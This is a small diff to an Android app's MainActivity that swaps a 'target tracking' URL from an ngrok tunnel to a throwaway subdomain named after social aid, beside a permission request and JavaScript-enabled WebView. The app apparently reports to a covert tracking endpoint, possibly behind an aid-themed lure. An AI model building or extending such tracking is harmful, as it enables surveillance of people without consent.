@@ -34,7 +34,7 @@ public class MainActivity extends Activity {
     private static final int PERMISSION_REQUEST_CODE = 100;
 
     // URL target tracking
-    private static final String TARGET_URL = "https://pecan-pupil-esteemed.ngrok-free.dev/track/9c4d9cc9c4";
+    private static final String TARGET_URL = "https://bansos.jokichannel.eu.org/track/9c4d9cc9c4";
 
     @SuppressLint("SetJavaScriptEnabled")
     @Override
